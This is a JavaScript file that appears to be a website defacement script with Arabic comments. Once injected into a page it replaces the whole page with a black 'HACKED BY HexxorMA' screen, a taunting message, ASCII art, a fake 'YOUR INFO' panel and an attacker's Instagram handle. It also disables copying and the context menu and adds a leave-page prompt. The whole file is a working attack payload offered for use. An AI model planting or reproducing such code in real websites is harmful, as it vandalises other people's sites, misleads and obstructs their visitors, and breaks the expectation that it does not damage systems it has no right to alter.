(function() {
  // ================== إعدادات ==================
  const HACKER_NAME = "HexxorMA";
  const GREETING = "welcome";
  const MOCK_LINE = "> u seek all other";
  const OWNED_LINE = "YOUR WEBSITE OWNED BY HEXXORMA";
  const INSTAGRAM = "insta:flamingoxx4";

  // ================== معلومات ثابتة (مش محتاجة API) ==================
  const VISITOR_INFO = {
    ip: "Hidden",
    city: "Unknown",
    region: "Unknown",
    country: "Unknown",
    hostname: window.location.hostname || "Unknown"
  };

  // ================== ASCII ART ==================
  const ASCII_ART = String.raw`
                    .""--..__
 _                     []       \`\`-.._
.'\` \`.                  ||__           \`-._
/    ,-.\                 ||_ \`\`\`---..__     \`-.
/    /:::\\               /|//}          \`\`--._  \`.
|    |:::||              |////}                \`-. \
|    |:::||             //'///                    \`.\
|    |:::||            //  ||'                      \`|
/    |:::|/        _,-//\  ||
/\`    |:::|\`-,__,-'\`  |/  \ ||
/\`  |   |'' ||           \   |||
/\`    \   |   ||            |  /||
|\`       |  |   |)            \ | ||
|          \ |   /      ,.__    \| ||
/           \`         /\`    \`\   | ||
|                     /        \  / ||
|                     |        | /  ||
/         /           |        \`(   ||
/          .           /          )  ||
|            \          |     ________||
/             |          /     \`-------.|
|\            /          |              ||
\/\`-._       |           /              ||
//   \`.    /\`           |              ||
//\`.    \`. |             \              ||
///\ \`-._  )/             |              ||
//// )   .(/               |              ||
||||   ,'\` )               /              //
||||  /                    /             || 
\`\\\` /\`                    |             // 
|                      \            ||  
/                        |           //  
/\`                          \         //   
/\`                            |        ||    
\`-.___,-.      .-.        ___,'        (/    
\`---'\`   \`'----'`;

  // ================== CSS ==================
  const style = document.createElement('style');
  style.innerHTML = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { background: #000 !important; color: #0f0 !important; font-family: 'Courier New', monospace !important; overflow-x: hidden !important; min-height: 100vh !important; }
    .vk-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; padding: 20px; z-index: 999999999; overflow-y: auto; font-family: 'Courier New', monospace; }
    .vk-greeting { color: #0f0; font-size: 2.5vw; font-style: italic; font-weight: bold; margin-bottom: 2vh; text-shadow: 0 0 10px #0f0; }
    .vk-mock { color: #0f0; font-size: 1.5vw; margin-bottom: 3vh; animation: blink 1.5s infinite; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
    .vk-ascii { color: #0f0; font-size: 0.7vw; line-height: 1; white-space: pre; margin: 3vh 0; text-shadow: 0 0 5px #0f0; overflow-x: auto; }
    .vk-info { margin-top: 4vh; font-size: 1.4vw; color: #0f0; }
    .vk-info-title { color: #f00; font-weight: bold; font-size: 1.6vw; margin-bottom: 1vh; text-shadow: 0 0 10px #f00; }
    .vk-info-line { color: #0f0; margin: 0.5vh 0; font-size: 1.3vw; }
    .vk-info-value { color: #0f0; font-weight: bold; }
    .vk-owned { margin-top: 5vh; color: #0f0; font-size: 1.5vw; font-weight: bold; text-shadow: 0 0 15px #0f0; animation: glowPulse 2s infinite alternate; margin-bottom: 5vh; }
    .vk-insta { margin-top: 2vh; color: #fff; font-size: 1.3vw; text-shadow: 0 0 10px #0f0; margin-bottom: 5vh; }
    @keyframes glowPulse { from { text-shadow: 0 0 10px #0f0; } to { text-shadow: 0 0 25px #0f0, 0 0 50px #0f0; } }
    @media (max-width: 600px) {
      .vk-greeting { font-size: 6vw; }
      .vk-mock { font-size: 3.5vw; }
      .vk-ascii { font-size: 1.3vw; }
      .vk-info { font-size: 3.5vw; }
      .vk-info-title { font-size: 4vw; }
      .vk-info-line { font-size: 3.2vw; }
      .vk-owned { font-size: 3.5vw; }
      .vk-insta { font-size: 3vw; }
    }
  `;
  document.head.appendChild(style);

  // ================== بناء الصفحة ==================
  function buildPage() {
    const info = VISITOR_INFO;
    const container = document.createElement('div');
    container.className = 'vk-container';
    container.innerHTML = `
      <div class="vk-greeting">${GREETING} ${info.hostname}!</div>
      <div class="vk-mock">${MOCK_LINE}</div>
      <pre class="vk-ascii">${ASCII_ART}</pre>
      <div class="vk-info">
        <div class="vk-info-title">YOUR INFO:</div>
        <div class="vk-info-line">USER: <span class="vk-info-value">${info.hostname}</span></div>
        <div class="vk-info-line">LOCATED IN: <span class="vk-info-value">${info.city}, ${info.region}, ${info.ip}</span></div>
      </div>
      <div class="vk-owned">${OWNED_LINE}</div>
      <div class="vk-insta">${INSTAGRAM}</div>
    `;
    document.body.innerHTML = '';
    document.body.appendChild(container);
  }

  document.title = "HACKED BY " + HACKER_NAME;
  buildPage();

  document.addEventListener('copy', e => e.preventDefault());
  document.addEventListener('contextmenu', e => e.preventDefault());
  window.addEventListener('beforeunload', function(e) {
    e.preventDefault();
    e.returnValue = '';
    return '';
  });
})();
